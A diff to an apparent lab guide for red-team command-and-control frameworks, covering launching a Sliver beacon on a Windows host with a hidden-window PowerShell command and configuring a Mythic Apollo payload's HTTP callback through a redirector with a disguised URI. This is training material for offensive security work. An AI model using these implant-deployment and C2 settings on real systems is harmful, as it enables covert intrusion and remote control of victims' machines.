@@ -101,11 +101,13 @@ In MobaXterm, `cd /tmp` in the Sliver SSH session; the SFTP panel follows the di
 scp admin@sliver:/tmp/sysProxy.exe C:\Users\Administrator\Desktop\sysProxy.exe
 ```
 
-Authenticate with `<LAB_PASSWORD>`. Then launch it:
+Authenticate with `<LAB_PASSWORD>`. Then launch it. Double-clicking `sysProxy.exe` on the Desktop works and is the simplest option. If you want to suppress the console window (so it does not flash and close on screen), use PowerShell instead:
 
 ```powershell
 Start-Process -FilePath "C:\Users\Administrator\Desktop\sysProxy.exe" -WindowStyle Hidden
 ```
+
+Either way, the beacon behavior is identical.
 
 Success: within ~10 seconds Sliver prints an incoming session notification.
 
@@ -134,23 +136,25 @@ Mythic ships with the HTTP profile and Apollo agent pre-installed, the token pre
 
 From the Windows operator (Guacamole RDP), open Chromium to `https://mythic:7443` and log in as `mythic_admin` / `<LAB_PASSWORD>`. If the portal will not load or the `http` profile is not accepting connections, see the wiki Mythic > Troubleshooting.
 
-Left sidebar > Create Payload. Under Apollo, click **Start Fresh** to begin a new payload build, then set:
+Left sidebar > **Create Payload**. The builder walks you through four sections in order:
 
-- Target OS: Windows
-- Payload: Apollo; Output Format `WinExe`
-- Commands: keep the default set (`shell`, `ps`, `run`, `upload`) and add `whoami`
-- C2 Profiles: pick `http`, click + INCLUDE PROFILE
+1. **Select OS** — choose `Windows`.
+2. **Select Payload** — choose `Apollo`. A **Continue from Existing Payload / Start Fresh** toggle appears; select **Start Fresh**.
+3. **Build Parameters** — set `Output Format` to `WinExe`.
+4. **Commands** — keep the default set (`shell`, `ps`, `run`, `upload`) and add `whoami`.
+	1. Find `whoami` on the left side, toggle it, and pres the single arrow `>` to add it to the payload build.
+5. **C2 Profiles** — pick `http`, click **+ INCLUDE PROFILE**.
 
 On the `http` profile, set only these fields, in the order they appear in the UI. Leave everything else (encryption, kill date, and so on) at its default:
 
-| Field             | Value                                                                             |
-| ----------------- | --------------------------------------------------------------------------------- |
-| callback_host     | `https://<REDIR_PUBLIC_IP>`                                                       |
-| callback_interval | `2` (seconds; fast cadence for demo visibility -- use 60+ for real ops)           |
-| callback_jitter   | `20` (percent)                                                                    |
-| callback_port     | `443`                                                                             |
-| headers           | Add a new header: KEY `X-Request-ID`, VALUE `<TOKEN>`. Then delete the default `Host` header |
-| post_uri          | `cdn/media/stream/update` (no leading `/`)                                        |
+| Field             | Value                                                                                                                                                                                             |
+| ----------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| callback_host     | `https://<REDIR_PUBLIC_IP>`                                                                                                                                                                       |
+| callback_interval | `2` (seconds; fast cadence for demo visibility)                                                                                                                                                   |
+| callback_jitter   | `20` (percent)                                                                                                                                                                                    |
+| callback_port     | `443`                                                                                                                                                                                             |
+| headers           | Add a new header: delete the default `Host` header. <br>KEY input `X-Request-ID`<br>VALUE: input the token from `deployment_info.txt` (the `X-Request-ID` line). Do not type `<TOKEN>` literally. |
+| post_uri          | `cdn/media/stream/update` (no leading `/`)                                                                                                                                                        |
 
 The `http` profile already carries a default User-Agent (browser-fingerprint) header; leave it. The default `Host` header, however, must be deleted, or the redirector sees the wrong Host and the callback never lands.
 
